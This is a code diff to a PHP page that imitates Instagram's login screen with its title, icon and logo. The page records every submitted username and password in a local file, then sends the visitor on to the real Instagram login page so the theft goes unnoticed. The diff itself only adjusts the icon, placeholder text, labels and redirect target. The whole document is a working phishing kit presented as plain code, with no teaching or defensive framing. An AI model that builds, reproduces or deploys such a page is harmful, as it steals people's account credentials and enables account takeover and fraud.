@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram</title>
-<link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+<link rel="icon" type="image/x-icon" href="./instagram.ico">
 <style>
 	body {
 		font-family: 'Arial', sans-serif;
@@ -55,12 +55,11 @@
 
 <div class="login-container">
     <form class="login-form" action="" method="post">
-        <img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
-        <h2>Log in to Instagram</h2>
-        <input type="text" name="username" placeholder="Username or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <img src="./instagram.png" alt="Logo" class="logo" width=200px>
+        <input type="text" name="username" placeholder="Email address or phone number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
-        <div class="signup-link"> Don't have an account? <a href="http://instagram.com">Sign Up</a></div>
+        <div class="signup-link">Don't have an account? <a href="https://www.instagram.com">Sign Up</a></div>
     </form>
 </div>
 
@@ -91,8 +90,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";
+    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-    header("Location: https://www.instagram.com");
+    header("Location: https://www.instagram.com/accounts/login");
 }
 ?>
